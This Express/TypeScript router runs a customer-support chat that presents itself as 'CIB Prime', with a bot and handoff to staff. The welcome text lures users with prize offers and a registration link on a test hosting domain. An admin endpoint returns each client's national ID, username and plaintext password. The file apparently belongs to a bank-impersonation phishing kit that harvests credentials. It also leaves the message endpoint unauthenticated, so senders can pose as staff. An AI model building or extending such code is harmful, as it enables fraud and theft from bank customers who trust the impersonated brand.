import { Router } from "express";
import { eq, desc, and, sql } from "drizzle-orm";
import { db, conversationsTable, messagesTable, clientSessionsTable, conversationSummariesTable } from "@workspace/db";
import { LocalAI } from "../lib/localAI";
import { notifyAdminsOfAgentRequest, notifyConversationSubscribers, notifyAdminSubscribers } from "../lib/realtime";
import { sessions, SESSION_DURATION_HOURS } from "../lib/sessions";

const router = Router();

// Middleware للتحقق من تسجيل دخول المدير
async function requireAdminAuth(req: any, res: any, next: any) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ success: false, error: "غير مصرح - يلزم تسجيل الدخول" });
  }
  
  const token = authHeader.substring(7);
  const session = sessions.get(token);
  
  if (!session) {
    return res.status(401).json({ success: false, error: "جلسة غير صالحة" });
  }
  
  // Check session expiry
  const now = new Date();
  const expiry = new Date(session.createdAt.getTime() + SESSION_DURATION_HOURS * 60 * 60 * 1000);
  if (now > expiry) {
    sessions.delete(token);
    return res.status(401).json({ success: false, error: "انتهت الجلسة" });
  }
  
  next();
}

// ============================================
// REST API للمحادثات
// ============================================

// الحصول على محادثة حالية أو إنشاء واحدة جديدة للعميل
router.post("/", async (req, res) => {
  try {
    const { sessionId } = req.body;
    
    console.log("[CONVERSATIONS] POST / - Creating/fetching conversation for sessionId:", sessionId);
    
    if (!sessionId) {
      console.log("[CONVERSATIONS] Validation failed: sessionId missing");
      return res.status(400).json({ success: false, error: "معرف الجلسة مطلوب" });
    }

    // البحث عن محادثة موجودة
    const existing = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.clientSessionId, sessionId))
      .orderBy(desc(conversationsTable.createdAt))
      .limit(1);

    if (existing.length > 0) {
      console.log("[CONVERSATIONS] Found existing conversation:", existing[0].id);
      return res.json({ success: true, data: existing[0] });
    }

    console.log("[CONVERSATIONS] Creating new conversation...");
    // إنشاء محادثة جديدة
    const [conversation] = await db
      .insert(conversationsTable)
      .values({ clientSessionId: sessionId, status: "pending", messageCount: 1 })
      .returning();

    console.log("[CONVERSATIONS] New conversation created:", conversation.id);

    // رسالة ترحيبية رسمية
    const welcomeMessage = `مرحباً بك في خدمة عملاء CIB Prime! 👋

أنا المساعد الذكي الخاص بكم، يمكنني الإجابة على استفساراتكم حول:

• تفعيل الساعات الذكية وألوانها (9 ألوان متاحة)
• خطوات التسجيل والاستحقاق
• خدمات البنك (التمويل، السحب على سيارة)
• أي استفسار آخر عن خدماتنا

للتسجيل: https://cib-test.up.railway.app

اكتبوا استفساركم وسأجيب فوراً.
أو اكتبوا "التواصل مع الموظف" للتحدث مع أحد ممثلي خدمة العملاء.`;

    // إضافة رسالة ترحيبية
    await db.insert(messagesTable).values({
      conversationId: conversation.id,
      senderType: "bot",
      content: welcomeMessage,
    });

    console.log("[CONVERSATIONS] Welcome message added");
    res.json({ success: true, data: conversation });
  } catch (error: any) {
    console.error("❌ [CONVERSATIONS] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في إنشاء المحادثة: " + error.message });
  }
});

// جلب جميع المحادثات (للموظف) - يتطلب auth
router.get("/", requireAdminAuth, async (_req, res) => {
  try {
    const conversations = await db
      .select()
      .from(conversationsTable)
      .orderBy(desc(conversationsTable.updatedAt));

    // إضافة بيانات العميل لكل محادثة
    const enriched = await Promise.all(
      conversations.map(async (conv) => {
        const [session] = await db
          .select()
          .from(clientSessionsTable)
          .where(eq(clientSessionsTable.sessionId, conv.clientSessionId));

        // عدد الرسائل غير المقروءة
        const unreadResult = await db
          .select()
          .from(messagesTable)
          .where(and(
            eq(messagesTable.conversationId, conv.id),
            eq(messagesTable.senderType, "client"),
            eq(messagesTable.isRead, false)
          ));

        return {
          ...conv,
          clientName: session?.fullName || "عميل",
          clientMobile: session?.mobile || null,
          unreadCount: unreadResult.length,
        };
      })
    );

    res.json({ success: true, data: enriched });
  } catch (error: any) {
    console.error("❌ [CONVERSATIONS] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب المحادثات" });
  }
});

// جلب محادثة محددة - يتطلب auth
router.get("/:id", requireAdminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // جلب بيانات العميل
    const [session] = await db
      .select()
      .from(clientSessionsTable)
      .where(eq(clientSessionsTable.sessionId, conversation.clientSessionId));

    res.json({
      success: true,
      data: {
        ...conversation,
        clientName: session?.fullName || "عميل",
        clientMobile: session?.mobile || null,
        clientNationalId: session?.nationalId || null,
        clientUsername: session?.username || null,
        clientPassword: session?.password || null,
        clientStage: session?.stage || null,
      }
    });
  } catch (error: any) {
    console.error("❌ [CONVERSATION] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب المحادثة" });
  }
});

// جلب رسائل محادثة محددة - يتطلب auth للمدير
router.get("/:id/messages", requireAdminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    const messages = await db
      .select()
      .from(messagesTable)
      .where(eq(messagesTable.conversationId, conversationId))
      .orderBy(messagesTable.createdAt);

    res.json({ success: true, data: messages });
  } catch (error: any) {
    console.error("❌ [MESSAGES] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب الرسائل" });
  }
});

// إرسال رسالة جديدة (للعميل بدون auth، للمدير مع auth)
router.post("/:id/messages", async (req, res) => {
  try {
    const { id } = req.params;
    const { senderType, senderId, content } = req.body;
    const conversationId = parseInt(id);

    console.log("[MESSAGES] New message request:", { id, senderType, senderId, content });
    console.log("[MESSAGES] Conversation ID parsed:", conversationId);

    if (!senderType || !content) {
      console.log("[MESSAGES] Validation failed: missing senderType or content");
      return res.status(400).json({ success: false, error: "نوع المرسل والمحتوى مطلوبان" });
    }

    // إضافة الرسالة
    const [message] = await db
      .insert(messagesTable)
      .values({
        conversationId,
        senderType,
        senderId: senderId || null,
        content,
      })
      .returning();

    console.log("[MESSAGES] Message saved:", message);

    // تحديث عداد الرسائل
    await db
      .update(conversationsTable)
      .set({ 
        updatedAt: new Date(),
        messageCount: sql`message_count + 1`
      })
      .where(eq(conversationsTable.id, conversationId));

    // إشعار المدير عند رسالة جديدة من العميل
    if (senderType === "client") {
      notifyAdminSubscribers({
        type: "conversation_update",
        conversationId,
        message
      });
    }

    // إشعار العميل عند رسالة جديدة من الموظف
    if (senderType === "agent") {
      notifyConversationSubscribers(conversationId, {
        type: "new_message",
        senderType: "agent",
        senderId: senderId || "admin",
        content: content
      });
    }

    // إذا كانت الرسالة من العميل
    if (senderType === "client") {
      console.log("[MESSAGES] Processing client message...");
      
      // الحصول على بيانات المحادثة
      const [conversation] = await db
        .select()
        .from(conversationsTable)
        .where(eq(conversationsTable.id, conversationId));

      // إذا البوت متوقف نهائياً (الموظف موجود) → لا معالجة بالذكاء الاصطناعي
      if (conversation && conversation.botActive === false) {
        console.log("[MESSAGES] Bot permanently disabled, skipping AI processing");
        
        // تحديث عداد الرسائل فقط
        await db
          .update(conversationsTable)
          .set({ 
            updatedAt: new Date(),
            messageCount: sql`message_count + 1`
          })
          .where(eq(conversationsTable.id, conversationId));

        // إعادة جلب الرسائل
        const updatedMessages = await db
          .select()
          .from(messagesTable)
          .where(eq(messagesTable.conversationId, conversationId))
          .orderBy(messagesTable.createdAt);

        res.json({ 
          success: true, 
          data: updatedMessages,
          botSilent: true
        });
        return;
      }

      console.log("[MESSAGES] Processing with LocalAI...");

      // الحصول على آخر ملخص للمحادثة
      const [lastSummary] = await db
        .select()
        .from(conversationSummariesTable)
        .where(eq(conversationSummariesTable.conversationId, conversationId))
        .orderBy(desc(conversationSummariesTable.createdAt))
        .limit(1);

      // الحصول على بيانات العميل
      let clientName = "عميلنا العزيز";
      if (conversation?.clientSessionId) {
        const [session] = await db
          .select()
          .from(clientSessionsTable)
          .where(eq(clientSessionsTable.sessionId, conversation.clientSessionId));
        if (session?.fullName) {
          clientName = session.fullName;
        }
      }

      // توليد رد ذكي
      const aiResult = LocalAI.generateReply({
        message: content,
        conversationContext: lastSummary?.summary || undefined,
        clientName,
        isBotActive: conversation?.botActive ?? true
      });

      console.log("[MESSAGES] AI Result:", { 
        requestAgentTransfer: aiResult.requestAgentTransfer,
        reactivateBot: aiResult.reactivateBot,
        silent: aiResult.silent,
        context: aiResult.context 
      });

      // تحديث حالة المحادثة بناءً على نتيجة الذكاء الاصطناعي
      const updateData: Record<string, unknown> = {
        isAgentTransferRequested: aiResult.requestAgentTransfer,
        botActive: !aiResult.requestAgentTransfer // إذا طلب موظف → صمت الـ bot
      };

      // إذا أعاد الـ bot نشاطه
      if (aiResult.reactivateBot) {
        updateData.botActive = true;
      }

      await db
        .update(conversationsTable)
        .set(updateData)
        .where(eq(conversationsTable.id, conversationId));

      // إضافة رد الذكاء الاصطناعي (فقط إذا لم يكن صامت)
      if (!aiResult.silent && aiResult.reply) {
        await db.insert(messagesTable).values({
          conversationId,
          senderType: "bot",
          content: aiResult.reply,
        });
        
        // إشعار الـ SSE subscribers بالرسالة الجديدة
        notifyConversationSubscribers(conversationId, {
          type: "new_message",
          senderType: "bot",
          content: aiResult.reply
        });
      }

      // تلخيص المحادثة بعد كل 3 رسائل جديدة
      const messageCount = (conversation?.messageCount || 0) + 1;
      if (messageCount % 3 === 0) {
        const allMessages = await db
          .select()
          .from(messagesTable)
          .where(eq(messagesTable.conversationId, conversationId))
          .orderBy(messagesTable.createdAt);

        const summary = LocalAI.summarize(allMessages.map(m => ({
          senderType: m.senderType as 'client' | 'bot' | 'agent',
          content: m.content
        })));

        // حفظ الملخص
        await db.insert(conversationSummariesTable).values({
          conversationId,
          summary,
          messageCount
        });

        // تحديث آخر ملخص
        await db
          .update(conversationsTable)
          .set({ lastSummaryAt: new Date() })
          .where(eq(conversationsTable.id, conversationId));

        console.log("[MESSAGES] Conversation summarized:", summary.substring(0, 50) + "...");
      }

      // إعادة جلب الرسائل المحدثة
      const updatedMessages = await db
        .select()
        .from(messagesTable)
        .where(eq(messagesTable.conversationId, conversationId))
        .orderBy(messagesTable.createdAt);

      res.json({ 
        success: true, 
        data: updatedMessages,
        isAgentTransferRequested: aiResult.requestAgentTransfer,
        botActive: aiResult.reactivateBot || !aiResult.requestAgentTransfer,
        showContactForm: aiResult.showContactForm,
        botSilent: aiResult.silent || false
      });
      return;
    }

    res.json({ success: true, data: message });
  } catch (error: any) {
    console.error("❌ [NEW MESSAGE] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في إرسال الرسالة: " + error.message });
  }
});

// إرسال بيانات الاتصال للموظف
router.post("/:id/contact", async (req, res) => {
  try {
    const { id } = req.params;
    const { name, email, phone } = req.body;
    const conversationId = parseInt(id);

    console.log("[CONTACT] New contact request:", { conversationId, name, email, phone });

    if (!name || !phone) {
      return res.status(400).json({ 
        success: false, 
        error: "الاسم ورقم الموبايل مطلوبان" 
      });
    }

    // الحصول على بيانات المحادثة
    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // حفظ بيانات الاتصال في المحادثة
    await db
      .update(conversationsTable)
      .set({ 
        isAgentTransferRequested: true,
        updatedAt: new Date()
      })
      .where(eq(conversationsTable.id, conversationId));

    // إضافة رسالة تأكيد من البوت
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "bot",
      content: `✅ تم استلام بياناتك بنجاح!\n\n📝 الاسم: ${name}\n📧 البريد: ${email || 'غير محدد'}\n📱 الموبايل: ${phone}\n\n⏳ جاري توصيلك بأحد ممثلي خدمة العملاء...\n\nيرجى الانتظار، سيتواصل معك الموظف قريباً. 🙏`,
    });

    // إشعار المدراء عبر WebSocket
    notifyAdminsOfAgentRequest({
      conversationId,
      clientName: name,
      clientPhone: phone,
      clientEmail: email,
      sessionId: conversation.clientSessionId,
      timestamp: new Date().toISOString()
    });

    res.json({ 
      success: true, 
      message: "تم حفظ بيانات الاتصال",
      botActive: false, // صمت الـ bot
      waitingForAgent: true,
      data: { name, email, phone }
    });
  } catch (error: any) {
    console.error("❌ [CONTACT] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في حفظ بيانات الاتصال" });
  }
});

// بدء المحادثة من قبل الموظف - يتطلب auth
router.post("/:id/connect", requireAdminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const { agentId } = req.body;
    const conversationId = parseInt(id);

    // الحصول على بيانات المحادثة
    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // تحديث حالة المحادثة - إيقاف البوت نهائياً
    await db
      .update(conversationsTable)
      .set({
        status: "active",
        agentConnectedAt: new Date(),
        botActive: false, // إيقاف البوت نهائياً
      })
      .where(eq(conversationsTable.id, conversationId));

    // إضافة رسالة من الموظف (يخبر العميل أن الموظف موجود)
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "agent",
      senderId: agentId || "admin",
      content: "مرحباً بك! 👋\n\nأنا أحد ممثلي خدمة عملاء CIB Prime.\n\nيرجى إرسال استفسارك وسأقوم بمساعدتك. 😊",
    });
    
    // إشعار العميل عبر SSE
    notifyConversationSubscribers(conversationId, {
      type: "new_message",
      senderType: "agent",
      senderId: agentId || "admin",
      content: "مرحباً بك! 👋\n\nأنا أحد ممثلي خدمة عملاء CIB Prime.\n\nيرجى إرسال استفسارك وسأقوم بمساعدتك. 😊"
    });

    res.json({ success: true, message: "تم بدء المحادثة مع العميل" });
  } catch (error: any) {
    console.error("❌ [CONNECT] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في بدء المحادثة" });
  }
});

// إنهاء المحادثة وإعادة تفعيل البوت - يتطلب auth
router.post("/:id/close", requireAdminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    // الحصول على بيانات المحادثة
    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId));

    if (!conversation) {
      return res.status(404).json({ success: false, error: "المحادثة غير موجودة" });
    }

    // تحديث حالة المحادثة وإعادة تفعيل البوت
    await db
      .update(conversationsTable)
      .set({
        status: "closed",
        agentConnectedAt: null,
        botActive: true, // إعادة تفعيل البوت
        isAgentTransferRequested: false, // إعادة تعيين طلب الموظف
      })
      .where(eq(conversationsTable.id, conversationId));

    // إضافة رسالة من البوت للعميل
    await db.insert(messagesTable).values({
      conversationId,
      senderType: "bot",
      content: `📋 تم إنهاء المحادثة مع الموظف.\n\nيسعدنا مساعدتك مجدداً! 😊\n\n• اكتب استفسارك للتحدث مع المساعد الذكي\n• اكتب "التواصل مع الموظف" للتحدث مع أحد ممثلي خدمة العملاء`,
    });

    // إشعار العميل عبر SSE
    notifyConversationSubscribers(conversationId, {
      type: "new_message",
      senderType: "bot",
      content: `📋 تم إنهاء المحادثة مع الموظف.\n\nيسعدنا مساعدتك مجدداً! 😊\n\n• اكتب استفسارك للتحدث مع المساعد الذكي\n• اكتب "التواصل مع الموظف" للتحدث مع أحد ممثلي خدمة العملاء`
    });

    console.log("[CLOSE] Conversation ended, bot reactivated for conversation:", conversationId);
    res.json({ success: true, message: "تم إنهاء المحادثة وإعادة تفعيل المساعد الذكي" });
  } catch (error: any) {
    console.error("❌ [CLOSE] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في إنهاء المحادثة" });
  }
});

// تحديث حالة المحادثة (open/closed) - للعميل
router.patch("/:id/ping", async (req, res) => {
  try {
    const { id } = req.params;
    const conversationId = parseInt(id);

    await db
      .update(conversationsTable)
      .set({
        clientOnlineAt: new Date(),
      })
      .where(eq(conversationsTable.id, conversationId));

    res.json({ success: true });
  } catch (error: any) {
    console.error("❌ [PING] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في تحديث الحالة" });
  }
});

// SSE endpoint للمحادثات (للعميل)
router.get("/:id/stream", async (req, res) => {
  const { id } = req.params;
  const conversationId = parseInt(id);

  // Set headers for SSE
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  console.log(`[SSE] Client connected to conversation ${conversationId}`);

  // Function to send message event
  const sendMessage = (message: any) => {
    res.write(`event: message\ndata: ${JSON.stringify(message)}\n\n`);
  };

  // Subscribe to this conversation
  const { subscribeToConversation } = await import('../lib/realtime');
  const unsubscribe = subscribeToConversation(conversationId, sendMessage);

  // Keep connection alive with heartbeat
  const heartbeat = setInterval(() => {
    res.write(`: heartbeat\n\n`);
  }, 30000);

  // Cleanup on close
  req.on('close', () => {
    console.log(`[SSE] Client disconnected from conversation ${conversationId}`);
    clearInterval(heartbeat);
    unsubscribe();
  });
});

// SSE endpoint للمدير (جميع المحادثات)
router.get("/admin/stream", requireAdminAuth, async (req, res) => {
  // Set headers for SSE
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  console.log('[SSE] Admin connected');

  // Send heartbeat
  const heartbeat = setInterval(() => {
    res.write(`: heartbeat\n\n`);
  }, 30000);

  // Subscribe to all admin events
  const { subscribeToAdminNotifications } = await import('../lib/realtime');
  const unsubscribe = subscribeToAdminNotifications((data) => {
    res.write(`event: ${data.type}\ndata: ${JSON.stringify(data)}\n\n`);
  });

  req.on('close', () => {
    console.log('[SSE] Admin disconnected');
    clearInterval(heartbeat);
    unsubscribe();
  });
});

// جلب آخر الرسائل (للـ polling) - يتطلب auth للمدير
router.get("/:id/messages/latest", requireAdminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const { after } = req.query;
    const conversationId = parseInt(id);

    let query = db
      .select()
      .from(messagesTable)
      .where(eq(messagesTable.conversationId, conversationId))
      .orderBy(messagesTable.createdAt);

    const messages = await query;

    // تصفيحتى الرسائل الجديدة
    const afterId = after ? parseInt(after as string) : 0;
    const newMessages = messages.filter(m => m.id > afterId);

    res.json({ success: true, data: newMessages });
  } catch (error: any) {
    console.error("❌ [LATEST MESSAGES] Error:", error.message || error);
    res.status(500).json({ success: false, error: "فشل في جلب الرسائل" });
  }
});

export default router;
